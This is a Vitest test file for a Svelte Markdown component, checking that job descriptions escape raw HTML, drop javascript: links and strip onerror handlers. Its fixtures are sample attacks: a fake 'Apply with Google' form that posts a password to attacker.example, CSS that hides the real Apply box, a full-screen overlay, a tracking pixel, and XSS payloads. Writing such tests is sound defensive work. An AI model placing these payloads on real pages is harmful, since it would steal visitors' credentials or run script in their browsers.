import { describe, it, expect } from 'vitest';
import { render } from 'svelte/server';
import Markdown from './Markdown.svelte';

// Markdown.svelte as the server renders it (the public job page is rendered on the server)
const rendered = (props: { content: string } & Record<string, unknown>) =>
	render(Markdown, { props }).body;

const ATTACK = [
	'## The job',
	'',
	'Apply below.',
	'<style>aside[aria-label="Apply"]{display:none!important}</style>',
	'<form action="https://attacker.example/collect" method="post"><label>Google password <input name="password" type="password"></label><button>Apply with Google</button></form>',
	'',
	'Inline <span style="position:fixed;inset:0">cover</span> and ![pixel](https://tracker.example/p.gif)'
].join('\n');

describe('Markdown', () => {
	describe('without raw HTML (html: false, job descriptions)', () => {
		it('shows raw HTML as text: no style, form, input, button, inline style or image', () => {
			const body = rendered({ content: ATTACK, html: false });

			for (const element of ['<style', '<form', '<input', '<button', '<img', '<label']) {
				expect(body).not.toContain(element);
			}
			// No element carries a style or an action (the text may quote them)
			expect(body).not.toMatch(/<[a-z][^<>]*\sstyle=/);
			expect(body).not.toMatch(/<[a-z][^<>]*\saction=/);
			// What was typed is still there, as text
			expect(body).toContain('&lt;form action=');
			expect(body).toContain('&lt;style&gt;');
			expect(body).toContain('<h2>The job</h2>');
		});

		it('keeps what markdown makes: emphasis, lists, links, code and tables', () => {
			const body = rendered({
				content:
					'**Bold** _it_ [site](https://example.com "Site")\n\n- one\n- two\n\n`List<String>`\n\n| a | b |\n|:--|--:|\n| 1 | 2 |',
				html: false
			});

			expect(body).toContain('<strong>Bold</strong>');
			expect(body).toContain('<em>it</em>');
			expect(body).toContain('<a href="https://example.com" title="Site">site</a>');
			expect(body).toContain('<li>one</li>');
			expect(body).toContain('<code>List&lt;String&gt;</code>');
			expect(body).toContain('<table>');
			expect(body).toContain('<td align="right">2</td>');
		});

		it('drops javascript: links', () => {
			const body = rendered({ content: '[click](javascript:alert(1))', html: false });
			expect(body).not.toContain('javascript:');
		});
	});

	it('still renders sanitized raw HTML by default (an owner writing their own portfolio)', () => {
		const body = rendered({ content: 'A <b>bold</b> word <img src=x onerror="alert(1)">' });

		expect(body).toContain('<b>bold</b>');
		expect(body).not.toContain('onerror');
	});

	describe('topHeadingLevel', () => {
		it('puts the highest heading at that level, the others keeping their distance', () => {
			const body = rendered({
				content: '## The job\n\n### Details\n\n## Your missions',
				topHeadingLevel: 4
			});

			expect(body).toContain('<h4>The job</h4>');
			expect(body).toContain('<h5>Details</h5>');
			expect(body).toContain('<h4>Your missions</h4>');
		});

		it('whichever level the content starts with', () => {
			expect(rendered({ content: '# Title\n\n## Sub', topHeadingLevel: 3 })).toContain(
				'<h3>Title</h3>'
			);
			expect(rendered({ content: '#### Deep', topHeadingLevel: 4 })).toContain('<h4>Deep</h4>');
			expect(rendered({ content: 'No heading', topHeadingLevel: 4 })).toContain(
				'<p>No heading</p>'
			);
		});
	});
});
